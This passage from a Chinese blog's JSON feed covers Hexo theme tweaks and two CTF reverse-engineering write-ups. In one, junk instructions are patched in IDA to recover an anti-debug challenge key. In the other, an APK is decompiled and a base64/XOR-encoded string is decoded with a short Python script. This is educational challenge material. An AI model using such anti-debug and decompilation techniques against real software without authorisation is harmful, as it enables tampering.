punctuation\">-</span>widget@latest/autoload.js\"<span class=\"token punctuation\">></span>&lt;/script<span class=\"token punctuation\">></span></pre></td></tr></table></figure><p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</p>\n<h2 id=\"利用本地资源\"><a class=\"anchor\" href=\"#利用本地资源\">#</a> 利用本地资源</h2>\n<p>整个文件夹 live2d-widget 放到 /source/js 文件夹里面</p>\n<p>autoload.js 的路径默认就行，也可以改本地，不影响。</p>\n<p>然后进入主题下的 /layout/_partials/head/head.njk 里面的最后几行代码修改为</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/rss+xml\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼11<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼12<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/atom+xml\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼13<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼14<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/json\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼15<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"&lt;<span class=\"token tag\">!--swig</span>￼16<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;link rel=\"alternate\" type=\"application/json\" title=\"&lt;<span class=\"token tag\">!--swig</span>￼17<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span>\" href=\"https<span class=\"token punctuation\">:</span>//cdn.jsdelivr.net/npm/font<span class=\"token punctuation\">-</span>awesome/css/font<span class=\"token punctuation\">-</span>awesome.min.css\" /<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>&lt;<span class=\"token tag\">!--swig</span>￼18<span class=\"token punctuation\">-</span><span class=\"token punctuation\">-</span><span class=\"token punctuation\">></span></pre></td></tr></table></figure><p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</p>\n<p>本地搭建是区别网上另一种方法，かねき けん师傅 tql</p>\n<p>我 debug 的时候报的 js 渲染错误，后来发现是 minify (十个亚压缩插件，减少文件大小) 的问题，注释掉，<s>搅屎棍</s>。</p>\n<h3 id=\"看板娘的模块问题\"><a class=\"anchor\" href=\"#看板娘的模块问题\">#</a> 看板娘的模块问题</h3>\n<p>个人认为 shoka 处理的不是很好，依赖项没怎么更新，也没有回复，插件的压缩依赖项没有及时支持 es6 规范，用 shoka 主题个人认为不推荐搞模块，大佬除外。</p>\n<h1 id=\"关于背景图片的问题\"><a class=\"anchor\" href=\"#关于背景图片的问题\">#</a> 关于背景图片的问题</h1>\n<p>背景图片有两处地方一个是主题下的_images.yml 文件，还有一个是根目录下的 /source/__data 下的 images.yml</p>\n<p>修改 source/__data 下的 images.yml 即可覆盖背景图，要 6 个以上，6 个以内好像有 bug。</p>\n<p>推荐使用 cdn，jsdelivr 来加速图片，创建图床，免费使用</p>\n<h1 id=\"一些基础的细节改shoka主题可以去大佬博客reversesacle添加功能魔改博客很详细-迭代中\"><a class=\"anchor\" href=\"#一些基础的细节改shoka主题可以去大佬博客reversesacle添加功能魔改博客很详细-迭代中\">#</a> 一些基础的细节，改 shoka 主题可以去大佬博客<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmV2ZXJzZXNhY2xlLmNvbS9IZXhvLVNob2thJUU0JUI4JUJCJUU5JUEyJTk4JUU1JThBJTlGJUU4JTgzJUJEJUU0JUJCJThCJUU3JUJCJThEJUU4JUExJUE1JUU1JTg1JTg1JUU3JTgyJUI5Lw==\"> ReverseSacle</span>，添加功能，魔改博客，很详细。迭代中........</h1>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "Reverse",
                "CTF"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/reverse/",
            "url": "https://zephyr-cyber.github.io.git/reverse/",
            "title": "学习Reverse",
            "date_published": "2021-12-01T01:05:47.265Z",
            "content_html": "<p>2021/10/21 更新了 REVERSE1-schoolboy.apk</p>\n<h1 id=\"antidebug\"><a class=\"anchor\" href=\"#antidebug\">#</a> Antidebug</h1>\n<p>使用 resource hacker 获得输入框的 id：<br />\n<img data-src=\"/img/reverse/antidebug1.jpg\" alt=\"avatar\" /></p>\n<p>用 ida 搜索立即数，可以搜索 0x3e8  可以直接搜索 1000：<br />\n<img data-src=\"/img/reverse/antidebug2.jpg\" alt=\"avatar\" /></p>\n<p>双击找到调用位置:<br />\n 发现有 jz 和 jnz 跳转到相同位置，初步怀疑这里有花指令影响了 ida 的正常运行：<br />\n<img data-src=\"/img/reverse/antidebug3.jpg\" alt=\"avatar\" /></p>\n<p>key path -&gt; Fill range 全部 pathc 为 nop。注意 00401524 是个多字节指令，先使用快捷键 d 转为数据，将 00401524patch 为 0x90 后，再将后边的使用快捷键 c 转为代码：<br />\n<img data-src=\"/img/reverse/antidebug4.jpg\" alt=\"avatar\" /></p>\n<p>在找到函数开始的位置 push ebp 的地方，右键 create function<br />\nF5 可以看到是固定判断，只要输入的值是 0xABCDDCBA  ，那也就是个数字了。<br />\n即 2882395322 就可以了。<br />\n<img data-src=\"/img/reverse/antidebug5.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"reverse1-schoolboyapk\"><a class=\"anchor\" href=\"#reverse1-schoolboyapk\">#</a> REVERSE1-schoolboy.apk</h1>\n<p>REVERSE1-schoolboy.apk<br />\nApk 文件反編譯<br />\n用一些 jeb jadx apkIDE 都可以<br />\n Jeb 和 apkIDE 搜索方便一點<br />\n Jadx 快一點</p>\n<p>我用的 apkIDE 和 jeb<br />\n 搜索 mainactivity<br />\n<img data-src=\"/img/reverse/reverseschoolboy1.jpg\" alt=\"avatar\" /></p>\n<p>反編譯<br />\n<img data-src=\"/img/reverse/reverseschoolboy2.jpg\" alt=\"avatar\" /></p>\n<p>找到主要内容<br />\n Id 號為 0x7F0E005D<br />\nGetStrings 方法<br />\n<img data-src=\"/img/reverse/reverseschoolboy3.jpg\" alt=\"avatar\" /></p>\n<p>用 smail 全局搜索 id 號得到<br />\n<img data-src=\"/img/reverse/reverseschoolboy4.jpg\" alt=\"avatar\" /></p>\n<p>Id 號為<br />\n<img data-src=\"/img/reverse/reverseschoolboy5.jpg\" alt=\"avatar\" /></p>\n<p>在 mysecret 裏面<br />\n搜索 strings.xml<br />\nresources.arsc-res-values-strings.xml<br />\n<img data-src=\"/img/reverse/reverseschoolboy6.jpg\" alt=\"avatar\" /></p>\n<p>找到 mysecret<br />\n<img data-src=\"/img/reverse/reverseschoolboy7.jpg\" alt=\"avatar\" /></p>\n<p>EBRQFBDfWY5MDgzOj9vbiNzdCcicXBxeiwteS0vfHtDQhZAFRwfWggJCgsMDQ4P<br />\n 看上去像加密的<br />\n寫脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token string\">\"REBRQFBDfWY5MDgzOj9vbiNzdCcicXBxeiwteS0vfHtDQhZAFRwfWggJCgsMDQ4P\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>b <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p a192862aa3bf46dffb57b12bdcc4c199=\"\"><img data-src=\"/img/reverse/reverseschoolboy8.jpg\" alt=\"avatar\" /><br />\n 直接出<br />\n flag:<br />\nDASCTF</p>\n",
            "tags": [
                "计算机科学",
                "CTF",
                "Reverse",
                "CTF",
                "Reverse"
            ]
        }
    ]
}